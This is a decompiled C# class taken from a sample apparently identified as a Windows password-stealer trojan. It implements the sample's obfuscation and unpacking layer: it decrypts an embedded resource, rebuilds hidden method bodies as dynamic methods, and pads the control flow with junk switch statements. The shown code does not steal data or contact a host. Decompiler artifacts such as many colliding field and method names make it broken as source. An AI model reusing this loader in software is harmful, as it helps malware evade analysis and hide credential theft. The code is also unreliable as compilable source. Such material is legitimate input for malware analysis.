// Decompiled with JetBrains decompiler
// Type: Ajowans.NodeSite
// Assembly: Ajowans, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B9451E92-9872-44E9-A53B-32BF899B0E6F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.Win32.Stealer.gen-ca27c07cc9fddcd8bc07b2b9aa3406ab019fb54797bf2163b190217e9c17ce6a.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Text;

namespace Ajowans
{
  internal class NodeSite
  {
    internal static readonly byte[] pathList;
    internal static readonly Dictionary<int, int> pathList;
    private static readonly ModuleHandle pathList;
    internal readonly int pathList;

    static NodeSite()
    {
      if (NodeSite.pathList == null)
      {
label_1:
        switch (7)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (NodeSite.\u002Ecctor);
            }
            byte[] bytes = Convert.FromBase64String("QWpvd2Fucyo=");
            string name = Encoding.UTF8.GetString(bytes, 0, bytes.Length);
            NodeSite.pathList = VectorProvider.RegisterFile(97L, Assembly.GetExecutingAssembly().GetManifestResourceStream(name));
            NodeSite.pathList = new Dictionary<int, int>();
            BinaryReader binaryReader = new BinaryReader((Stream) new MemoryStream(NodeSite.pathList, false));
            try
            {
              int num1 = binaryReader.ReadInt32();
              for (int index = 0; index < num1; ++index)
              {
                int key = binaryReader.ReadInt32();
                int num2 = binaryReader.ReadInt32();
                NodeSite.pathList[key] = num2;
              }
label_8:
              switch (2)
              {
                case 0:
                  goto label_8;
              }
            }
            finally
            {
              if (binaryReader != null)
              {
label_11:
                switch (3)
                {
                  case 0:
                    goto label_11;
                  default:
                    binaryReader.Dispose();
                    break;
                }
              }
            }
            break;
        }
      }
      if ((object) typeof (MulticastDelegate) == null)
        return;
label_15:
      switch (5)
      {
        case 0:
          goto label_15;
        default:
          NodeSite.pathList = Assembly.GetExecutingAssembly().GetModules()[0].ModuleHandle;
          break;
      }
    }

    internal static void RegisterFile(int pathList, int generatorCache, int previousHandler)
    {
      Type typeFromHandle;
      MethodBase methodFromHandle;
      try
      {
        typeFromHandle = Type.GetTypeFromHandle(NodeSite.pathList.ResolveTypeHandle(pathList));
        methodFromHandle = MethodBase.GetMethodFromHandle(NodeSite.pathList.ResolveMethodHandle(generatorCache), NodeSite.pathList.ResolveTypeHandle(previousHandler));
      }
      catch (Exception ex)
      {
        throw;
      }
      foreach (FieldInfo field in typeFromHandle.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField))
      {
        try
        {
          MethodBody methodBody = methodFromHandle.GetMethodBody();
          Type[] typeArray = NodeSite.RegisterFile(methodFromHandle);
          string name = methodFromHandle.DeclaringType.FullName + "." + methodFromHandle.Name + "_Encrypted$";
          Type returnType;
          if ((object) (methodFromHandle as ConstructorInfo) == null)
          {
label_5:
            switch (7)
            {
              case 0:
                goto label_5;
              default:
                if (false)
                {
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle = __methodref (NodeSite.RegisterFile);
                }
                returnType = ((MethodInfo) methodFromHandle).ReturnType;
                break;
            }
          }
          else
            returnType = (Type) null;
          Type[] parameterTypes = typeArray;
          Type declaringType = methodFromHandle.DeclaringType;
          DynamicMethod dynamicMethod = new DynamicMethod(name, returnType, parameterTypes, declaringType, true);
          int pathList1;
          NodeSite.pathList.TryGetValue(pathList, out pathList1);
          DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
          NodeSite.RegisterFile(methodBody, dynamicIlInfo);
          NodeSite.RegisterFile(ref pathList1, methodFromHandle, dynamicIlInfo);
          NodeSite.RegisterFile(ref pathList1, dynamicIlInfo);
          Delegate @delegate = dynamicMethod.CreateDelegate(typeFromHandle);
          field.SetValue((object) null, (object) @delegate);
        }
        catch (Exception ex)
        {
        }
      }
label_14:
      switch (4)
      {
        case 0:
          goto label_14;
      }
    }

    private static void RegisterFile(
      ref int pathList,
      MethodBase generatorCache,
      DynamicILInfo previousHandler)
    {
      int int32_1 = BitConverter.ToInt32(NodeSite.pathList, pathList);
      pathList += 4;
      int int32_2 = BitConverter.ToInt32(NodeSite.pathList, pathList);
      pathList += 4;
      byte[] numArray = new byte[int32_2];
      Buffer.BlockCopy((Array) NodeSite.pathList, pathList, (Array) numArray, 0, int32_2);
      new NodeSite.SymbolType(generatorCache, numArray, previousHandler).RegisterFile();
      previousHandler.SetCode(numArray, int32_1);
      pathList += int32_2;
    }

    private static void RegisterFile(MethodBody pathList, DynamicILInfo generatorCache)
    {
      SignatureHelper localVarSigHelper = SignatureHelper.GetLocalVarSigHelper();
      IEnumerator<LocalVariableInfo> enumerator = pathList.LocalVariables.GetEnumerator();
      try
      {
        while (enumerator.MoveNext())
        {
          LocalVariableInfo current = enumerator.Current;
          localVarSigHelper.AddArgument(current.LocalType, current.IsPinned);
        }
label_4:
        switch (1)
        {
          case 0:
            goto label_4;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (NodeSite.RegisterFile);
              break;
            }
            break;
        }
      }
      finally
      {
        if (enumerator != null)
        {
label_8:
          switch (3)
          {
            case 0:
              goto label_8;
            default:
              enumerator.Dispose();
              break;
          }
        }
      }
      generatorCache.SetLocalSignature(localVarSigHelper.GetSignature());
    }

    private static void RegisterFile(ref int pathList, DynamicILInfo generatorCache)
    {
      int int32_1 = BitConverter.ToInt32(NodeSite.pathList, pathList);
      pathList += 4;
      if (int32_1 == 0)
      {
label_1:
        switch (6)
        {
          case 0:
            goto label_1;
          default:
            if (true)
              break;
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (NodeSite.RegisterFile);
            break;
        }
      }
      else
      {
        byte[] numArray = new byte[int32_1];
        Buffer.BlockCopy((Array) NodeSite.pathList, pathList, (Array) numArray, 0, int32_1);
        int startIndex = 4;
        int num1 = (int32_1 - 4) / 24;
        for (int index = 0; index < num1; ++index)
        {
          ExceptionHandlingClauseOptions int32_2 = (ExceptionHandlingClauseOptions) BitConverter.ToInt32(numArray, startIndex);
          int num2 = startIndex + 20;
          switch (int32_2)
          {
            case ExceptionHandlingClauseOptions.Clause:
              RuntimeTypeHandle type = NodeSite.pathList.ResolveTypeHandle(BitConverter.ToInt32(numArray, num2));
              NodeSite.RegisterFile(generatorCache.GetTokenFor(type), num2, numArray);
              break;
            case ExceptionHandlingClauseOptions.Fault:
              throw new NotSupportedException("dynamic method does not support fault clause");
          }
          startIndex = num2 + 4;
        }
label_11:
        switch (5)
        {
          case 0:
            goto label_11;
          default:
            generatorCache.SetExceptions(numArray);
            break;
        }
      }
    }

    public static void RegisterFile(int pathList, int generatorCache, byte[] previousHandler)
    {
      previousHandler[generatorCache++] = (byte) pathList;
      previousHandler[generatorCache++] = (byte) (pathList >> 8);
      previousHandler[generatorCache++] = (byte) (pathList >> 16);
      previousHandler[generatorCache++] = (byte) (pathList >> 24);
    }

    private static Type[] RegisterFile(MethodBase pathList)
    {
      ParameterInfo[] parameters = pathList.GetParameters();
      int length = parameters.Length;
      if (!pathList.IsStatic)
      {
label_1:
        switch (6)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (NodeSite.RegisterFile);
            }
            ++length;
            break;
        }
      }
      Type[] typeArray = new Type[length];
      int index1 = 0;
      if (!pathList.IsStatic)
      {
label_6:
        switch (3)
        {
          case 0:
            goto label_6;
          default:
            if (pathList.DeclaringType.IsValueType)
            {
label_8:
              switch (3)
              {
                case 0:
                  goto label_8;
                default:
                  typeArray[0] = pathList.DeclaringType.MakeByRefType();
                  break;
              }
            }
            else
              typeArray[0] = pathList.DeclaringType;
            ++index1;
            break;
        }
      }
      int index2 = 0;
      while (index2 < parameters.Length)
      {
        typeArray[index1] = parameters[index2].ParameterType;
        ++index2;
        ++index1;
      }
label_15:
      switch (5)
      {
        case 0:
          goto label_15;
        default:
          return typeArray;
      }
    }

    public sealed class SymbolType
    {
      private static OpCode[] pathList = new OpCode[256];
      private static OpCode[] generatorCache = new OpCode[256];
      private int pathList;
      private byte[] pathList;
      private DynamicILInfo pathList;
      private Module pathList;
      private Type[] pathList;
      private Type[] generatorCache;

      static SymbolType()
      {
        foreach (FieldInfo field in typeof (OpCodes).GetFields(BindingFlags.Static | BindingFlags.Public))
        {
          OpCode opCode = (OpCode) field.GetValue((object) null);
          ushort index = (ushort) opCode.Value;
          if (index < (ushort) 256)
          {
label_2:
            switch (4)
            {
              case 0:
                goto label_2;
              default:
                if (false)
                {
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle = __methodref (NodeSite.SymbolType.\u002Ecctor);
                }
                NodeSite.SymbolType.pathList[(int) index] = opCode;
                continue;
            }
          }
          else if (((int) index & 65280) == 65024)
          {
label_7:
            switch (4)
            {
              case 0:
                goto label_7;
              default:
                NodeSite.SymbolType.generatorCache[(int) index & (int) byte.MaxValue] = opCode;
                continue;
            }
          }
        }
label_11:
        switch (5)
        {
          case 0:
            goto label_11;
        }
      }

      public SymbolType(MethodBase pathList, byte[] generatorCache, DynamicILInfo previousHandler)
      {
        this.pathList = previousHandler;
        this.pathList = generatorCache;
        this.pathList = 0;
        this.pathList = pathList.Module;
        Type[] typeArray1;
        if ((object) (pathList as ConstructorInfo) == null)
        {
label_1:
          switch (3)
          {
            case 0:
              goto label_1;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (NodeSite.SymbolType.\u002Ector);
              }
              typeArray1 = pathList.GetGenericArguments();
              break;
          }
        }
        else
          typeArray1 = (Type[]) null;
        this.pathList = typeArray1;
        Type[] typeArray2;
        if ((object) pathList.DeclaringType != null)
        {
label_7:
          switch (5)
          {
            case 0:
              goto label_7;
            default:
              typeArray2 = pathList.DeclaringType.GetGenericArguments();
              break;
          }
        }
        else
          typeArray2 = (Type[]) null;
        this.generatorCache = typeArray2;
      }

      internal void RegisterFile()
      {
        while (this.pathList < this.pathList.Length)
          this.RegisterFile();
label_3:
        switch (6)
        {
          case 0:
            goto label_3;
          default:
            if (true)
              break;
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (NodeSite.SymbolType.RegisterFile);
            break;
        }
      }

      private object RegisterFile()
      {
        int pathList = this.pathList;
        OpCode nop = OpCodes.Nop;
        byte index1 = this.RegisterFile();
        OpCode path;
        if (index1 != (byte) 254)
        {
label_1:
          switch (6)
          {
            case 0:
              goto label_1;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (NodeSite.SymbolType.RegisterFile);
              }
              path = NodeSite.SymbolType.pathList[(int) index1];
              break;
          }
        }
        else
        {
          byte index2 = this.RegisterFile();
          path = NodeSite.SymbolType.generatorCache[(int) index2];
        }
        switch (path.OperandType)
        {
          case OperandType.InlineBrTarget:
            this.RegisterFile(4);
            return (object) null;
          case OperandType.InlineField:
            this.PrintDirectory(this.pathList.GetTokenFor(this.pathList.ResolveField(this.RegisterFile(), this.generatorCache, this.pathList).FieldHandle), pathList + path.Size);
            return (object) null;
          case OperandType.InlineI:
            this.RegisterFile(4);
            return (object) null;
          case OperandType.InlineI8:
            this.RegisterFile(8);
            return (object) null;
          case OperandType.InlineMethod:
            MethodBase methodBase1 = this.pathList.ResolveMethod(this.RegisterFile(), this.generatorCache, this.pathList);
            this.PrintDirectory(this.pathList.GetTokenFor(methodBase1.MethodHandle, methodBase1.DeclaringType.TypeHandle), pathList + path.Size);
            return (object) null;
          case OperandType.InlineNone:
            return (object) null;
          case OperandType.InlineR:
            this.RegisterFile(8);
            return (object) null;
          case OperandType.InlineSig:
            this.PrintDirectory(this.pathList.GetTokenFor(this.pathList.ResolveSignature(this.RegisterFile())), pathList + path.Size);
            return (object) null;
          case OperandType.InlineString:
            this.PrintDirectory(this.pathList.GetTokenFor(this.pathList.ResolveString(this.RegisterFile())), pathList + path.Size);
            return (object) null;
          case OperandType.InlineSwitch:
            this.RegisterFile(this.RegisterFile() * 4);
            return (object) null;
          case OperandType.InlineTok:
            int num = this.RegisterFile();
            MemberInfo memberInfo = this.pathList.ResolveMember(num, this.generatorCache, this.pathList);
            if (memberInfo.MemberType != MemberTypes.TypeInfo)
            {
label_23:
              switch (5)
              {
                case 0:
                  goto label_23;
                default:
                  if (memberInfo.MemberType == MemberTypes.NestedType)
                  {
label_25:
                    switch (3)
                    {
                      case 0:
                        goto label_25;
                    }
                  }
                  else
                  {
                    if (memberInfo.MemberType != MemberTypes.Method)
                    {
label_28:
                      switch (2)
                      {
                        case 0:
                          goto label_28;
                        default:
                          if (memberInfo.MemberType == MemberTypes.Constructor)
                          {
label_30:
                            switch (5)
                            {
                              case 0:
                                goto label_30;
                            }
                          }
                          else if (memberInfo.MemberType == MemberTypes.Field)
                          {
label_33:
                            switch (1)
                            {
                              case 0:
                                goto label_33;
                              default:
                                num = this.pathList.GetTokenFor((memberInfo as FieldInfo).FieldHandle);
                                goto label_35;
                            }
                          }
                          else
                            goto label_35;
                          break;
                      }
                    }
                    MethodBase methodBase2 = memberInfo as MethodBase;
                    num = this.pathList.GetTokenFor(methodBase2.MethodHandle, methodBase2.DeclaringType.TypeHandle);
                    goto label_35;
                  }
                  break;
              }
            }
            num = this.pathList.GetTokenFor((memberInfo as Type).TypeHandle);
label_35:
            this.PrintDirectory(num, pathList + path.Size);
            return (object) null;
          case OperandType.InlineType:
            this.PrintDirectory(this.pathList.GetTokenFor(this.pathList.ResolveType(this.RegisterFile(), this.generatorCache, this.pathList).TypeHandle), pathList + path.Size);
            return (object) null;
          case OperandType.InlineVar:
            this.RegisterFile(2);
            return (object) null;
          case OperandType.ShortInlineBrTarget:
            this.RegisterFile(1);
            return (object) null;
          case OperandType.ShortInlineI:
            this.RegisterFile(1);
            return (object) null;
          case OperandType.ShortInlineR:
            this.RegisterFile(4);
            return (object) null;
          case OperandType.ShortInlineVar:
            this.RegisterFile(1);
            return (object) null;
          default:
            throw new BadImageFormatException("unexpected OperandType " + (object) path.OperandType);
        }
      }

      private void RegisterFile(int pathList) => this.pathList += pathList;

      private byte RegisterFile() => this.pathList[this.pathList++];

      private int RegisterFile()
      {
        int pathList = this.pathList;
        this.pathList += 4;
        return BitConverter.ToInt32(this.pathList, pathList);
      }

      private void PrintDirectory(int pathList, int generatorCache)
      {
        this.pathList[generatorCache++] = (byte) pathList;
        this.pathList[generatorCache++] = (byte) (pathList >> 8);
        this.pathList[generatorCache++] = (byte) (pathList >> 16);
        this.pathList[generatorCache++] = (byte) (pathList >> 24);
      }
    }
  }
}
